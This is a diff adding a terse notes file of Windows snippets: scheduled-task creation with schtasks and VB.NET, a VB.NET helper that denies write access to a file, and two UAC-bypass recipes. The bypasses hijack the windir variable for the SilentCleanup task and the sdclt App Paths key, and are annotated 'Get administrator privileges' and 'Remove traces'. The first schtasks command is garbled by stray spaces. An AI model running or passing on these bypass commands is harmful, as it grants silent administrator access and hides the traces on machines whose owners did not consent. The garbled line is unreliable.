@@ -1,0 +1,32 @@
+Creation (under admin):
+schtasks / create / tn "\ TestCreationTask" / tr "\" c: \ Some directory \ example.exe \ "/ SC ONCE / ST 12:00 / RL HIGHEST / F
+
+Dim KeyToSend as string = " /Create /SC MONTHLY /D 11 /TN "SFTP_FILE_Javier" /TR "\"C:\Users\salasfri\Documents\Visual Studio 2012\Projects\prjFileTrans20151102\prjFileTrans\prjFileTrans\bin\Debug\prjFileTrans.exe\" SFTP_FILE" /ST 16:44"
+taskProcess.StartInfo = New ProcessStartInfo(Environment.SystemDirectory + "\SchTasks.exe", KeyToSend)
+taskProcess.Start()    
+
+Imports System.Security.AccessControl
+  //Get current user
+  Dim user As String = System.Security.Principal.WindowsIdentity.GetCurrent().Name
+  
+ //Deny writing to the file
+AddDirectorySecurity(@"C:\Users\Phil\Desktop\hello.ini",user, FileSystemRights.Write, AccessControlType.Deny)
+Public Shared Sub AddDirectorySecurity(ByVal FileName As String, ByVal Account As String, ByVal Rights As FileSystemRights, ByVal ControlType As AccessControlType)
+    Dim dInfo As DirectoryInfo = New DirectoryInfo(FileName)
+    Dim dSecurity As DirectorySecurity = dInfo.GetAccessControl()
+    dSecurity.AddAccessRule(New FileSystemAccessRule(Account, Rights, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, ControlType))
+    dInfo.SetAccessControl(dSecurity)
+End Sub
+
+
+SilentCleanup
+> reg add hkcu\Environment /v windir /d "cmd /K reg delete hkcu\Environment /v windir /f && REM "
+> schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+Sdclt
+win10
+1
+>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d %COMSPEC% /f  Get administrator privileges 
+>sdclt  eject cmd
+>reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f  Remove traces 
+
+
